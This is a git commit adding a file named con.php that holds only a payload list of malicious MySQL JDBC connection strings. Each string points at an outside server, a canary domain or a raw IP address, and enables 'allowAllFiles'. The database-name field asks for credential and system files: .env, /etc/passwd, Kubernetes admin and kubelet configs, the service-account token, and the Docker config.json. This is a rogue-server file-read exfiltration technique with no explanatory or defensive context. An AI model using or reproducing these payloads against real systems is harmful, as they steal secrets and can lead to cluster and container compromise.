70c02b40abb0fb702887fd62a61541bd2f5a97c5
Shubs <infosec-au@users.noreply.github.com>
2024-02-23 17:09:32 +0800

    Create con.php

---
+++ con.php
@@ -0,0 +1,24 @@
+my jdbc is jdbc:mysql://root:root@wrg.lol.devint.lol.lol.ssrfcanary.com:3306/%2fproc%2fself%2fcwd%2f.env?allowAllFiles=true&t=1
+jdbc:mysql://root:root@wrg.lol.devint.lol.lol.ssrfcanary.com:3306/%2fetc%2fhostname?allowAllFiles=true&t=1
+jdbc:mysql://root:root@wrg.lol.devint.lol.lol.ssrfcanary.com:3306/%2fetc%2fpasswd?allowAllFiles=true&t=1
+jdbc:mysql://root:root@wrg.lol.devint.lol.lol.ssrfcanary.com:3306/%2fetc%2flsb-release?allowAllFiles=true&t=1
+jdbc:mysql://root:root@wrg.lol.devint.lol.lol.ssrfcanary.com:3306/%2fetc%2fresolv.conf?allowAllFiles=true&t=1
+
+my jdbc is jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fproc%2fself%2fcwd%2f.env?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fhostname?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fpasswd?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306):3306/%2fetc%2flsb-release?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fresolv.conf?allowAllFiles=true&t=1
+
+
+
+my jdbc is jdbc:mysql://root:root@tcp(51.159.31.124:3306)/mydb?allowAllFiles=true&t=1
+
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fkubernetes%2fkubelet.conf?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fkubernetes%2fbootstrap-kubelet.conf?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fkubernetes%2fbootstrap-kubelet.conf?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fdocker%2fdaemon.json?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2froot%2f.docker%2fconfig.json?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fvar%2frun%2fsecrets%2fkubernetes.io%2fserviceaccount%2ftoken?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fkubernetes%2fadmin.conf?allowAllFiles=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fkubernetes%2fkubeconfig?allowAllFiles=true&t=1
